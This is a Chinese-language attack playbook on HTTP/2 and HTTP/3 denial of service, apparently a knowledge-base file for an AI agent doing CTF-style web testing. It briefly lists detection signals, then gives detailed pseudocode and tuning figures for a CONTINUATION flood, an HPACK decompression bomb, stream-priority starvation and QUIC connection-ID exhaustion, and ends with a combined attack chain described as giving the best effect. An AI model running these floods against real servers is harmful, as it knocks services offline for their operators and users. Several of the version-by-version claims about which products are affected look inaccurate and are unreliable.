# HTTP/2 CONTINUATION Flood & H2/H3 高级攻击

## 场景

HTTP/2 的多路复用和帧协议为攻击者提供了远超 HTTP/1.1 的攻击面。除 Rapid Reset (CVE-2023-44487) 外，CONTINUATION Flood (CVE-2024-27316) 和 HPACK Bomb 利用更底层的帧处理和头部压缩机制，单连接即可使服务器 OOM 或 CPU 100%。

## 输入信号

- 单连接上出现大量 `HEADERS` 帧后跟 `CONTINUATION` 但无 `END_HEADERS` 标志
- HTTP/2 连接中 stream 状态一半以上处于 `OPEN` 或 `HALF_CLOSED` (等待头部完成)
- 服务器内存持续增长，`nginx` / `envoy` / `httpd` 进程 RSS 线性上升直至 OOM
- `netstat -s` 显示 TCP 连接重置率异常低但活跃连接数异常高 (stream 占满但不提交)
- HTTP/2 帧日志中 `HEADERS` 与 `CONTINUATION` 比例异常 (> 1:3)
- 单个 HTTP/2 连接持有 10 万+ 未关闭 stream (正常情况下 < 1000)
- WAF/CDN 日志中出现大量 `RST_STREAM` 与 `HEADERS` 交替模式
- HPACK 动态表引用索引集中在极小区间 (1-20)，说明大量头部复用填充值

---

## 方法 1: CONTINUATION Flood (CVE-2024-27316)

### 原理

HTTP/2 的 HEADERS 帧如果放不下所有头部，可以用 CONTINUATION 帧续传。**漏洞核心**：服务端在收到带有 END_HEADERS 标志的帧之前，将收到的所有头部缓存在内存中。

```
正常流程:
  HEADERS(frame_1, END_HEADERS=0)  → 缓存头部
  CONTINUATION(frame_2, END_HEADERS=0)  → 追加缓存
  CONTINUATION(frame_3, END_HEADERS=1)  → 解析完成

攻击流程:
  HEADERS(frame_1, END_HEADERS=0)  → 开始缓存
  [永不发送 END_HEADERS]
  [持续发送 CONTINUATION + reset stream, 再开新 stream]
  → 每个未完成的 HEADERS 占用内存
  → 海量 stream 同时挂起
  → OOM
```

### 关键参数

```
单 stream 未完成头部最大体积: 无限制 (漏洞)
可同时挂起 stream 数: 2^31 - 1
每 HEADERS+CONTINUATION 字节: ~50 bytes (最小帧)
攻击者带宽 10 Mbps → 每秒约 25000 个挂起的头部流
1 分钟后 → 1,500,000 个挂起 stream
每个 stream 缓存 64KB → 96 GB 内存
```

### 伪代码

```
function h2_continuation_flood(target_host, target_port=443, duration_sec=60):
    # 建立 h2 连接
    conn = h2_connect(target_host, target_port)
    
    # 初始化连接
    conn.send_preface()
    conn.send_settings()
    
    deadline = now() + duration_sec
    stream_count = 0
    
    while now() < deadline:
        # 每个循环创建一批挂起的 stream
        for batch in 1..1000:
            sid = conn.new_stream_id()
            
            # 发送 HEADERS 帧，END_HEADERS=0
            headers_frame = build_headers_frame(
                stream_id=sid,
                end_stream=False,
                end_headers=False,  # 关键: 永远不置位
                payload=":method: GET\r\n:path: /\r\n:authority: " + 
                        target_host + "\r\n" +
                        "x-padding: " + "A" * 4096  # 加大头部体积
            )
            conn.send_frame(headers_frame)
            
            # 可选: 发送 CONTINUATION 但不结束
            # continuation = build_continuation_frame(sid, END_HEADERS=0, data="B"*1024)
            # conn.send_frame(continuation)
            
            stream_count += 1
        
        # 消费服务器响应，避免自己连接断开
        conn.drain_receive_buffer()
        
        if stream_count % 10000 == 0:
            elapsed = now() - (deadline - duration_sec)
            print("[*] {stream_count} streams pending, {stream_count/elapsed:.0f} streams/s")
    
    return stream_count
```

### 受影响范围

```
受影响 (CVE-2024-27316):
  - nginx < 1.26.0          (挂起 stream 内存泄漏)
  - Apache httpd < 2.4.60    (worker 内存持续增长)
  - Envoy < 1.29.3           (OOM 崩溃)
  - Node.js < 21.6.2         (event loop 阻塞)
  - Go net/http < 1.22.1     (goroutine 泄漏)
  - Apache Tomcat < 10.1.20
  - Jetty < 12.0.8
  - Netty < 4.1.108

与 CVE-2023-44487 (Rapid Reset) 对比:
  Rapid Reset: 打 CPU (创建/销毁流的高速循环)
  CONTINUATION: 打内存 (挂起流 + 累积头部缓存)
  
  两者组合: CPU + 内存同时打满 → 更快 OOM
```

## 方法 2: HPACK Bomb — 头部压缩放大

### 原理

HTTP/2 使用 HPACK 压缩头部。攻击者利用动态表 (dynamic table) 的引用机制，构造精心设计的头部使解压器分配大量内存。

```
HPACK 动态表: 
  - 最大 4096 或 65536 bytes (SETTINGS_HEADER_TABLE_SIZE)
  - 新头部插入表头，旧的从表尾移除
  - 引用通过索引 (1-indexed)

攻击向量:
  1. 发送大量大尺寸头部填充动态表
  2. 后续帧用 1-2 bytes 引用这些大头部
  3. 服务端解压器被迫为每个引用扩展出完整值
  4. 单帧可"解压"出数十 MB 头部数据
```

### 伪代码

```
function hpack_bomb(target, table_size=65536, bomb_mb=500):
    conn = h2_connect(target)
    
    # Step 1: 用大头部填充动态表
    large_header_value = "A" * 4096  # 4KB per entry
    
    for i in 0 .. (table_size / 4096):
        # 插入 header: x-fill-{i}: AAAA...
        # 这使动态表填满并驱逐旧条目
        headers_frame = build_headers_frame(
            stream_id=conn.new_stream_id(),
            end_stream=True,
            end_headers=True,
            headers=[("x-fill-" + str(i), large_header_value)]
        )
        conn.send_frame(headers_frame)
    
    # Step 2: 发送引用型炸弹
    # 构造 HEADERS 帧，使用大量索引引用填充的动态表条目
    # 每个引用 1-2 bytes，但解压展开后 4KB
    
    bomb_streams = bomb_mb * 256  # 每个 stream 约 4KB 展开
    for i in 0 .. bomb_streams:
        # 使用 HPACK 索引引用来引用已填充的大头部
        bomb_header = build_hpack_indexed_header(
            table_index=1 + (i % 16),  # 引用动态表中的条目
        )
        # 发送 HEADERS 帧，内部填充大量索引引用
        # 解压后头部体积 >> 帧体积
        frame = build_headers_frame(
            sid=conn.new_stream_id(),
            end_stream=True,
            end_headers=True,
            hpack_literal=bomb_header
        )
        conn.send_frame(frame)
```

## 方法 3: Stream Multiplexing 饥饿

### 原理

HTTP/2 的 stream 优先级机制可被滥用。通过创建大量高优先级 stream 并永不完成，饿死合法请求的 stream。

```
正常:
  stream A (weight 16) + stream B (weight 16) → 各 50% 带宽

攻击:
  stream 1..1000 (weight 256, 每个持续 HOLD)
  stream 1001 (正常请求, weight 16)
  → 正常请求分到的带宽 = 16 / (1000*256 + 16) ≈ 0.006%
  → 一个 10KB 的响应需要数分钟才能传输完
```

### 伪代码

```
function stream_priority_starvation(target, hold_count=5000):
    conn = h2_connect(target)
    
    # 创建大量高优先级挂起 stream
    hold_streams = []
    for i in 0 .. hold_count:
        sid = conn.new_stream_id()
        
        # 发送 HEADERS，声明优先级 weight=256, 依赖 stream 0
        headers = build_priority_headers(
            sid=sid,
            exclusive=False,
            stream_dependency=0,
            weight=256  # 最大权重
        )
        
        # END_STREAM=0, END_HEADERS=1
        # 头部已完整，但永不关闭 stream
        frame = build_headers_frame(sid, end_stream=False, 
                                     end_headers=True,
                                     headers=headers,
                                     body_continuation="pending")
        conn.send_frame(frame)
        hold_streams.append(sid)
    
    # 每 30 秒发 WINDOW_UPDATE 维持连接
    while True:
        sleep(30)
        for sid in hold_streams[::100]:  # 采样续命
            conn.send_frame(build_window_update(sid, 1))
        conn.drain_receive_buffer()
```

## 方法 4: HTTP/3 QUIC 攻击面

```
HTTP/3 基于 QUIC (UDP)，引入了新的 DoS 向量:

1. Connection ID 耗尽:
   QUIC 使用 Connection ID 路由连接
   服务器维持 CID → connection 的映射表
   攻击者发送大量含随机 CID 的 Initial 包
   → 服务器为每个 CID 分配状态 → 映射表耗尽

2. 0-RTT 重放放大:
   攻击者捕获合法 ClientHello，重放 N 次
   服务器为每个 0-RTT 分配连接资源
   每个重放还可包含 HTTP 请求
   乘数: 1 个 ClientHello → N 个并发连接

3. Version Negotiation 风暴:
   攻击者发送含随机版本号的 Initial 包
   服务器回复 Version Negotiation (比 Initial 大)
   放大系数: 1x (Initial ≈ VN 大小)
   但大量 VN 仍可填充上行链路

4. Stateless Reset 消耗:
   服务器 CPU 在生成 stateless reset token 时的计算
   大量无效连接 → token 生成 + HMAC 计算
```

### QUIC CID 耗尽伪代码

```
function quic_cid_exhaust(target, cid_count=1000000):
    # QUIC Initial 包构造
    for i in 0 .. cid_count:
        # 随机 Destination Connection ID
        dcid = random_bytes(random_choice([8, 16, 20]))
        scid = random_bytes(8)
        
        # QUIC Initial 包 (long header)
        packet = build_quic_initial(
            dcid=dcid,
            scid=scid,
            token=b"",  # 无 token
            crypto_data=build_tls_client_hello(sni=target)
        )
        
        udp_send(target, 443, packet)
        
        if i % 10000 == 0:
            print("[*] {i} random CIDs sent")
```

## 攻击链混合方案

```
组合攻击 (最佳效果):
  Step 1: HTTP/2 Rapid Reset → CPU 100%
  Step 2: CONTINUATION Flood → 内存泄漏 1GB+/min
  Step 3: HPACK Bomb → 解压器内存放大
  Step 4: Stream Priority Starvation → 剩余请求停滞
  
  效果: CPU/内存/带宽 三维打满，恢复时间数倍于单一攻击
```

## 参考资料

1. CVE-2024-27316 — HTTP/2 CONTINUATION Flood (2024.04, CVSS 7.5)
2. CVE-2023-44487 — HTTP/2 Rapid Reset (2023.10, CVSS 7.5)
3. RFC 9113 — HTTP/2 (Stream Multiplexing, Frame Format)
4. RFC 7541 — HPACK: Header Compression for HTTP/2
5. "CONTINUATION frames in HTTP/2 can be abused for DoS attacks" — Cloudflare Blog, 2024
6. nginx 1.26.0 changelog — HTTP/2 CONTINUATION flood mitigation
7. "HTTP/2: The Sequel is Always Worse" — James Kettle, Black Hat 2021
8. RFC 9000 — QUIC: A UDP-Based Multiplexed and Secure Transport
9. CVE-2022-32293 — TCP Middlebox Reflection (AWS NLB)
10. Envoy 1.29.3 changelog — CONTINUATION flood fix

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| H2 端点探测 | `http_probe` | 检测目标是否支持 HTTP/2 (ALPN h2) |
| 技术搜索 | `kb_router` | 搜索 http2 / h2 / continuation / rapid_reset |
| CVE 查阅 | `kb_read_file` | 读取本文件及 01-application-layer-dos (Rapid Reset) |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
